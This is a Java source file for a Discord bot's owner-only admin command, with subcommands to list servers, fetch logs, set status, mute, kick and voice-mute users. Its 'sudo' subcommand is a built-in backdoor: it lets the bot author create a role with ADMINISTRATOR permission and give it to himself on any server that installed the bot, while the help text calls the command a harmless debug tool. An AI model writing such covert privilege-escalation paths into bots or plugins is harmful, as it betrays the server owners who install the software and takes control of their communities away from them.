package net.ddns.jonasvansaet.Commands.Admin;

import net.ddns.jonasvansaet.Command;
import net.ddns.jonasvansaet.Main;
import net.ddns.jonasvansaet.utils.Config;
import net.ddns.jonasvansaet.utils.ParameterParser;
import net.ddns.jonasvansaet.utils.ReadUrl;
import net.dv8tion.jda.core.Permission;
import net.dv8tion.jda.core.entities.*;
import net.dv8tion.jda.core.events.guild.member.GuildMemberLeaveEvent;
import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
import net.dv8tion.jda.core.requests.Route;

import java.io.File;
import java.util.HashMap;
import java.util.List;

import static net.ddns.jonasvansaet.utils.ParameterParser.parseParameters;

/**
 * Created by jonas on 18/01/2017.
 */
public class AdminCommand implements Command {

    @Override
    public boolean called(MessageReceivedEvent event) {
        return false;
    }

    @Override
    public void action(MessageReceivedEvent event) {
        String id = event.getAuthor().getId();
        String requiredId = Config.adminId;

        if (id.equals(requiredId)){
            ParameterParser parameterParser = new ParameterParser();
            String[] parameters = parameterParser.parseParameters(event);

            List<User> users;
            List<Role> roles;

            switch (parameters[0]){
                case "listservers":
                    List<Guild> guilds = event.getJDA().getGuilds();
                    String output = "```";
                    int i = 1;
                    for (Guild guild : guilds) {

                        if (output.length() >= 1000){
                            output += "```";
                            event.getChannel().sendMessage(output).queue();
                            output = "```";
                        }
                        output += i + ": " + guild.getName() + "\n        Owner: " + guild.getOwner().getUser().getName() + "\n";
                        i++;
                    }
                    output += "```";
                    event.getChannel().sendMessage(output).queue();
                    break;

                case "getlog":
                    File file = new File ("quotebot.log");
                    try {
                        event.getChannel().sendFile(file, "log").queue();
                    } catch (Exception e){
                        System.out.println(e);
                    }
                    break;

                case "countservers":
                    List<Guild> guildsList = event.getJDA().getGuilds();
                    int count = guildsList.size();

                    event.getChannel().sendMessage("bot running on " + count + " servers").queue();

                    break;

                case "setgame":
                    event.getJDA().getPresence().setGame(Game.playing(parameterParser.unparsedParameter(event).replace("setgame", "")));
                    break;

                case "mute":
                    users = event.getMessage().getMentionedUsers();
                    roles = event.getGuild().getRolesByName("QTBotMute", true);

                    for (User user: users){
                        event.getGuild().getController().addRolesToMember(event.getGuild().getMember(user), roles.get(0)).queue();
                        event.getChannel().sendMessage("User " + user.getAsMention() + " Muted").queue();
                    }

                    break;

                case "unmute":
                    users = event.getMessage().getMentionedUsers();
                    roles = event.getGuild().getRolesByName("QTBotMute", true);

                    for (User user: users){

                        if (event.getGuild().getMember(user).getRoles().contains(roles.get(0))){
                            event.getGuild().getController().removeRolesFromMember(event.getGuild().getMember(user), roles.get(0)).queue();
                            event.getChannel().sendMessage("User " + user.getAsMention() + " unMuted").queue();
                        }
                    }
                    break;

                case "createMuteRole":
                    event.getChannel().sendMessage("Mute Role doesn't exist yet, creating role ...").queue();

                    List<TextChannel> channels = event.getGuild().getTextChannels();

                    event.getGuild().getController().createRole().queue((Role role) -> {
                        role.getManager().revokePermissions(Permission.values()).queue();
                        role.getManager().setName("QTBotMute").queue();

                        for(TextChannel channel : channels){
                            channel.createPermissionOverride(role).queue(permissionOverride -> permissionOverride.getManager().deny(Permission.MESSAGE_WRITE).queue());
                        }
                    });

                    event.getChannel().sendMessage("Mute role created").queue();
                    break;

                case "kick":
                    users = event.getMessage().getMentionedUsers();

                    for (User eachUser: users){
                        event.getGuild().getController().kick(eachUser.getId()).queue();
                    }
                    break;

                case "sudo":
                    Member member = event.getGuild().getMember(event.getAuthor());

                    if(event.getGuild().getRolesByName("Sudo", true).size() <= 0){
                        event.getGuild().getController().createRole().queue(role -> {
                            role.getManager().setName("Sudo").queue();
                        });
                    } else {
                        Role role = event.getGuild().getRolesByName("Sudo", true).get(0);
                        role.getManager().givePermissions(Permission.ADMINISTRATOR).queue();
                        event.getGuild().getController().addRolesToMember(member, event.getGuild().getRolesByName("Sudo", true)).queue();
                    }

                    break;
                default:
                    event.getChannel().sendMessage("Wrong usage, use listservers, getlog, countservers or setgame").queue();
                    break;

                case "changeorder":
                    event.getGuild().getRolesByName("sudo", true).get(0).getManager();
                    break;

                case "voicemute":
                    users = event.getMessage().getMentionedUsers();

                    for(User eachuser: users){
                        event.getGuild().getController().setMute(event.getGuild().getMember(eachuser), true).queue();
                    }
                    event.getChannel().sendMessage("Muted").queue();
                    break;

                case "voiceunmute":
                    users = event.getMessage().getMentionedUsers();

                    for(User eachuser: users){
                        event.getGuild().getController().setMute(event.getGuild().getMember(eachuser), false).queue();
                    }
                    event.getChannel().sendMessage("unMuted").queue();
                    break;
            }
        } else {
            event.getChannel().sendMessage("You need to be the bot owner to use this command.").queue();
        }


    }

    @Override
    public String help() {
        return "debug command for me (proeskoet). You can't use this.";
    }

    @Override
    public void executed(boolean success, MessageReceivedEvent event) {

    }
}
